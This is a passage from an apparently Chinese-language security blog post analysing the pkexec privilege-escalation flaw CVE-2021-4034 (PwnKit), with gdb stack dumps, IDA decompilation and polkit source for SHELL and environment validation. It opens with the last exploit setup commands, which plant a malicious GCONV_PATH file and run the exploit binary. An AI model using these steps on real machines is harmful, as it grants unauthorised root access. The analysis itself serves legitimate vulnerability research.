gconv-modules</span><br><span class=\"line\">cp -f /usr/bin/true ./GCONV_PATH=./evilib.so:.</span><br><span class=\"line\">./exp</span><br></pre></td></tr></table></figure>\n<h2 id=\"补充调试\"><a class=\"markdownIt-Anchor\" href=\"#补充调试\">#</a> 补充调试</h2>\n<p><a href=\"https://hub.docker.com/r/chenaotian/cve-2021-4034\">https://hub.docker.com/r/chenaotian/cve-2021-4034</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">catch exec</span><br><span class=\"line\">r</span><br><span class=\"line\">b *$rebase(0x2380)</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/08/11/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/image.png\" alt=\"image\"></p>\n<p>两次结果对比</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">02:0010│     0x7fffa507a720 —▸ 0x7fffa507bfad ◂— &#x27;pwnkitdir&#x27;</span><br><span class=\"line\">03:0018│     0x7fffa507a728 —▸ 0x7fffa507bfb7 ◂— &#x27;PATH=GCONV_PATH=.&#x27;</span><br><span class=\"line\">04:0020│     0x7fffa507a730 —▸ 0x7fffa507bfc9 ◂— &#x27;CHARSET=PWNKIT&#x27;</span><br><span class=\"line\">05:0028│     0x7fffa507a738 —▸ 0x7fffa507bfd8 ◂— &#x27;SHELL=xxx&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00:0000│ rax 0x7fffa507a720 —▸ 0x55b966a37f50 ◂— &#x27;GCONV_PATH=./pwnkitdir&#x27;</span><br><span class=\"line\">01:0008│     0x7fffa507a728 —▸ 0x7fffa507bfb7 ◂— &#x27;PATH=GCONV_PATH=.&#x27;</span><br><span class=\"line\">02:0010│     0x7fffa507a730 —▸ 0x7fffa507bfc9 ◂— &#x27;CHARSET=PWNKIT&#x27;</span><br><span class=\"line\">03:0018│     0x7fffa507a738 —▸ 0x7fffa507bfd8 ◂— &#x27;SHELL=xxx&#x27;</span><br></pre></td></tr></table></figure>\n<p>ida 审计到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">if</span> ( *v19 != <span class=\"string\">&#x27;/&#x27;</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    program_in_path = g_find_program_in_path(v19);</span><br><span class=\"line\">    v21 = program_in_path;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( program_in_path )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v22 = v7;</span><br><span class=\"line\">      v7 = (gchar *)program_in_path;</span><br><span class=\"line\">      g_free(v22);</span><br><span class=\"line\">      *(_QWORD *)opt_usera = v21; &lt;&lt;--------------------- argv[n] = path = s;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_34;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v38 = v7;</span><br><span class=\"line\">    v37 = strerror(<span class=\"number\">2</span>);</span><br><span class=\"line\">    v36 = <span class=\"string\">&quot;Cannot run program %s: %s\\n&quot;</span>;</span><br><span class=\"line\">LABEL_55:</span><br><span class=\"line\">    v8 = <span class=\"number\">127</span>;</span><br></pre></td></tr></table></figure>\n<p>根据字符串定位到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">      <span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_strcmp0(type, <span class=\"string\">&quot;SHELL&quot;</span>) )<span class=\"comment\">// 获取到SHELL的环境变量</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v151 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        v152[<span class=\"number\">0</span>] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_file_get_contents(<span class=\"string\">&quot;/etc/shells&quot;</span>, &amp;v151, <span class=\"number\">0LL</span>, v152) )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          v28 = <span class=\"number\">0</span>;</span><br><span class=\"line\">          v29 = g_strsplit(v151, <span class=\"string\">&quot;\\n&quot;</span>, <span class=\"number\">0LL</span>);<span class=\"comment\">//shells</span></span><br><span class=\"line\">          <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">          &#123;<span class=\"comment\">// 如果终止条件满足</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( !v29 || (v30 = *(_QWORD *)(v29 + <span class=\"number\">8LL</span> * v28)) == <span class=\"number\">0</span> )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              v31 = v29;</span><br><span class=\"line\">              v6 = (<span class=\"type\">const</span> <span class=\"type\">char</span> **)subjecta;</span><br><span class=\"line\">              v7 = local_agent_handle;</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> LABEL_47;<span class=\"comment\">// 直接跳过去</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_strcmp0(v27, v30) )</span><br><span class=\"line\">              <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            ++v28;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          g_free(v151);</span><br><span class=\"line\">          g_strfreev(v29);</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> LABEL_58;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        v6 = (<span class=\"type\">const</span> <span class=\"type\">char</span> **)subjecta;</span><br><span class=\"line\">        v7 = local_agent_handle;</span><br><span class=\"line\">        v31 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        g_printerr(<span class=\"string\">&quot;Error getting contents of /etc/shells: %s\\n&quot;</span>, *(<span class=\"type\">const</span> <span class=\"type\">char</span> **)(v152[<span class=\"number\">0</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        g_error_free(v152[<span class=\"number\">0</span>]);</span><br><span class=\"line\">LABEL_47:</span><br><span class=\"line\">        g_free(v151);</span><br><span class=\"line\">        g_strfreev(v31);</span><br><span class=\"line\">        log_message(<span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"string\">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_file_get_contents(<span class=\"string\">&quot;/etc/shells&quot;</span>, &amp;v151, <span class=\"number\">0LL</span>, v152) )</span><br><span class=\"line\">LABEL_48:</span><br><span class=\"line\">        v32 = <span class=\"string\">&quot;\\nThis incident has been reported.\\n&quot;</span>;</span><br><span class=\"line\">LABEL_49:</span><br><span class=\"line\">        v8 = <span class=\"number\">127</span>;</span><br><span class=\"line\">        g_printerr(v32);</span><br><span class=\"line\">        g_free(<span class=\"number\">0LL</span>);</span><br></pre></td></tr></table></figure>\n<p><code>v28</code>  是 idx，可以得知这是个数组<br>\n反馈到源码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shells = g_strsplit (contents, <span class=\"string\">&quot;\\n&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (n = <span class=\"number\">0</span>; shells != <span class=\"literal\">NULL</span> &amp;&amp; shells[n] != <span class=\"literal\">NULL</span>; n++)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (g_strcmp0 (shell, shells[n]) == <span class=\"number\">0</span>)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        ret = TRUE;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>在后面调用了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">      <span class=\"comment\">/* To qualify for the paranoia goldstar - we validate the value of each</span></span><br><span class=\"line\"><span class=\"comment\">       * environment variable passed through - this is to attempt to avoid</span></span><br><span class=\"line\"><span class=\"comment\">       * exploits in (potentially broken) programs launched via pkexec(1).</span></span><br><span class=\"line\"><span class=\"comment\">       */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!validate_environment_variable (key, value))</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">然后里面又调用了---------------------------------------------------</span><br><span class=\"line\">  <span class=\"comment\">/* special case $SHELL */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (g_strcmp0 (key, <span class=\"string\">&quot;SHELL&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* check if it&#x27;s in /etc/shells */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!is_valid_shell (value))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          log_message (LOG_CRIT, TRUE,</span><br><span class=\"line\">                       <span class=\"string\">&quot;The value for the SHELL variable was not found in the /etc/shells file&quot;</span>);</span><br><span class=\"line\">          g_printerr (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                      <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">-----------------------------------------------------------------------</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (n = <span class=\"number\">0</span>; shells != <span class=\"literal\">NULL</span> &amp;&amp; shells[n] != <span class=\"literal\">NULL</span>; n++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (g_strcmp0 (shell, shells[n]) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          ret = TRUE;</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> out:</span><br><span class=\"line\">  g_free (contents);</span><br><span class=\"line\">  g_strfreev (shells);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Linux",
                "User state"
            ]
        }
    ]
}